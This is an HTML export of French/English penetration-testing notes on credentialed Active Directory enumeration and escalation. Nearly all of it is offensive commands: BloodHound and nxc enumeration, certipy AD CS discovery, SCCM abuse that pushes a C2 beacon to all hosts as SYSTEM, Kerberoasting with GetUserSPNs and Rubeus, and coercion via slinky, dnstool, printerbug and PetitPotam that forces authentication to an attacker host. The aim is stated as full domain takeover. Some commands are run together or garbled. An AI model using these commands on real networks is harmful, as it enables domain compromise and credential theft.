<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>05- Credentialed Enumeration & Pr√©-Escalades</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>05- Credentialed Enumeration & Pr√©-Escalades</h1><br/><p> <em>(pr√©requis : identifiants valides en clair / NT hash / ticket Kerberos)</em></p><p><ol><li>1. <h2>1. Classic Enumeration ‚Äî Users / Shares / ACL &amp; Delegation</h2></p><p></li></ol><table class="table"><tr><th>Objectif</th><th>Commandes cl√©s</th><th>Sortie</th></tr><tr><td>Lister tous les comptes</td><td>GetADUsers.py -all -dc-ip &lt;dc_ip&gt; domain/username</p><p></p><p>nxc smb &lt;dc_ip&gt; -u &quot;&lt;user&gt;&quot; -p &quot;&lt;pwd&gt;&quot; --users</p><p>nxc rdp/winrm $target -u $user -p $password </td><td>Username</td></tr><tr><td>Scanner les partages SMB</td><td>nxc smb &lt;ip_range&gt; -u &quot;&lt;user&gt;&quot; -p &quot;&lt;pwd&gt;&quot; -M spider_plus</p><p></p><p>manspider &lt;ip_range&gt; -p &lt;ext&gt; -d &lt;dom&gt; -u &lt;user&gt; -p &lt;pwd&gt;</td><td>Shares / files int√©ressants</td></tr><tr><td>BloodHound (legacy)</td><td>bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pwd&gt; -gc dc -c All</p><p></p><p>rusthound -d &lt;domain&gt; -u &lt;user&gt;@&lt;dom&gt; -p &lt;pwd&gt; -z &lt;out&gt;.zip -c allSharpHound.exe -c All -d &lt;domain&gt;</td><td>ACL üü¶‚ÄÇ Delegation üü©‚ÄÇ Username</td></tr><tr><td>BloodHound CE</td><td>bloodhound-python ‚Ä¶ -s Allrusthound-ce ‚Ä¶ --ldap-filter(objectGuid=*)SharpHoundCE -c All -d &lt;domain&gt;</p><p></p><p>SOAPHound.exe -c binary -o BloodHound-output</p><p></p><p>rusthound-ce --domain $domain -u $user -p $password --zip</td><td>ACL / Delegation</td></tr><tr><td>Enum LDAP</td><td>ldeep ldap -u &lt;user&gt; -p &lt;pwd&gt; -d &lt;dom&gt; -s ldap://&lt;dc_ip&gt; all backup_folderldapdomaindump.py -u &lt;user&gt; -p &lt;pwd&gt; &lt;dc_ip&gt;ldapsearch -x -H ldap://&lt;ip&gt; -D &quot;&lt;user&gt;&quot; -w &lt;pwd&gt; -b &quot;&quot;</td><td>ACL üü¶ Delegation üü© Username</td></tr><tr><td>Enum DNS</td><td>adfind -u &lt;dom&gt;\&lt;user&gt; -p &lt;pwd&gt; /print-zones &lt;dc_ip&gt;</td><td>Nouvelles cibles (low-hanging fruit)</td></tr></table></p><p><ol><li>2. <h2>2. Enumerate AD CS (Certificate Services)</h2></p><p></li></ol><div class="codebox"><pre>certipy.exe find -dc-ip <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br />certipy find -u <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>pwd<span style="color:#ff9d00;font-weight:700">&gt;</span> -dc-ip <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div> </p><p>=&gt;<em>ADCS Exploitation</em> üü™ (ESC1-10 chemins potentiels)</p><p><ol><li>3. <h2>3. Enumerate SCCM</h2></li></ol></p><p></p><p><h3>Phase 1: Enumeration (Locating the Infrastructure)</h3></p><p></p><p><code>scruthquery -d &lt;dom&gt; -u &lt;user&gt; -p &lt;pwd&gt; -d &lt;dom&gt; -dc-ip &lt;dc_ip&gt; --debug</code></p><p><strong>Action:</strong> Queries Active Directory for registered SCCM Management Points.</p><p></p><p><strong>Goal:</strong> Identifies the <strong>Site Code</strong> and <strong>Server IPs</strong> without touching the target directly.</p><p></p><p></p><p></p><p><code>ldeep ldap -u &lt;user&gt; -p &lt;pwd&gt; -d &lt;dom&gt; -s ldap://&lt;dc_ip&gt; sccm</code></p><p><strong>Action:</strong> LDAP extraction of the <code>System Management</code> container.</p><p></p><p><strong>Goal:</strong> Retrieves configuration data (Site Code, MP) directly from AD attributes if standard queries fail.</p><p></p><p></p><p></p><p><strong><code>SharpSCCM.exe local site-info</code></strong></p><p><strong>Action:</strong> Queries local WMI (<code>root\ccm</code>) on a compromised host.</p><p></p><p><strong>Goal:</strong> Asks the agent &quot;Who is your master?&quot; to find the Management Point from the inside.</p><p></p><p></p><p></p><p></p><p></p><p></p><p><h3>Phase 2: Exploitation</h3></p><p></p><p><strong>Push Package (The &quot;King&#39;s Key&quot;)</strong><ul><li><strong>Method:</strong> Create a malicious &quot;Application&quot; (C2 beacon) in SCCM.</li></ul></p><p><ul><li><strong>Result:</strong> SCCM pushes and executes your malware as <strong>SYSTEM</strong> on all domain-joined machines.</li></ul></p><p></p><p></p><p></p><p><strong>Pivot / Coercion</strong><ul><li><strong>Method:</strong> Force the SCCM server to authenticate to you (e.g., via <code>PetitPotam</code> or <code>SharpSCCM invoke</code>).</li></ul></p><p><ul><li><strong>Result:</strong> <strong>NTLM Relay</strong> the credentials to compromise other servers, or decrypt <strong>Network Access Account (NAA)</strong> credentials stored on clients.</li></ul></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><ol><li>4. <h2>4. Automated Scan (contr√¥le posture)</h2></li></ol></p><p><code>PingCastle.exe --healthcheck --server &lt;domain&gt;</code></p><p></p><p><code>Invoke-ADPEAS -Domain &lt;domain&gt; -Server &lt;dc_ip&gt;</code></p><p> ‚û°Ô∏è Rapports de risque pr√™ts pour triage.</p><p></p><p></p><p><ol><li>5. <h2>5. Kerberoasting (SPN =&gt; TGS hash)</h2></li></ol></p><p>BloodHound Cypher : <code>MATCH (u:User) WHERE u.hasspn=true AND u.enabled=true ‚Ä¶ RETURN u</code></p><p></p><p><code>GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;pwd&gt;</code></p><p></p><p><code>Rubeus.exe kerberoast /domain:&lt;dom&gt;</code></p><p> ‚û°Ô∏è <em>Hash TGS</em> üüß (cracking offline ‚Üí escalade)</p><p></p><p></p><p><ol><li>6. <h2>6. Coercion (forcer une auth NTLM/HTTP)</h2></p><p></li></ol><table class="table"><tr><th>M√©thode</th><th>Exemple de drop / commande</th><th>R√©sultat</th></tr><tr><td>Drop file (.lnk / .scf / .url)</td><td>nxc smb &lt;dc_ip&gt; -u &quot;&lt;user&gt;&quot; -p &quot;&lt;pwd&gt;&quot; -M slinky -o NAME=\\&lt;attacker&gt;\share\&lt;file&gt;</td><td>Auth forc√©e</td></tr><tr><td>WebDAV</td><td>dnstool.py -u &lt;dom&gt;\&lt;user&gt; -p &lt;pwd&gt; --record &lt;atk&gt; --action add -data &lt;ip_atk&gt;Lancer serveur WebDAV catdater_hostname@80/t</td><td>HTTP Coerce üü°</td></tr><tr><td>RPC call</td><td>printerbug.py &lt;domain&gt;/&lt;user&gt;:&lt;pwd&gt;@&lt;printer_ip&gt;petitpotam.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pwd&gt; --target &lt;ip&gt;</td><td>SMB NTLM Coerce üü¢</td></tr></table></p><p></p><p><h2>Livrables de la phase 5</h2></p><p>Graphe BloodHound/CE enrichi : <strong>ACL, d√©l√©gations, chemins d‚Äô√©l√©vation</strong>.</p><p></p><p>Cibles suppl√©mentaires : AD CS templates vuln√©rables, serveurs SCCM, machines nouvellement d√©couvertes.</p><p></p><p>Hashes TGS pr√™ts pour cracking.</p><p></p><p>Techniques de coercition d√©ploy√©es (HTTP / SMB) ouvrant la voie au <strong>mouvement lat√©ral</strong> et √† la <strong>domination finale du domaine</strong>.</p><p></p><p></p></div>
</body>
</html>
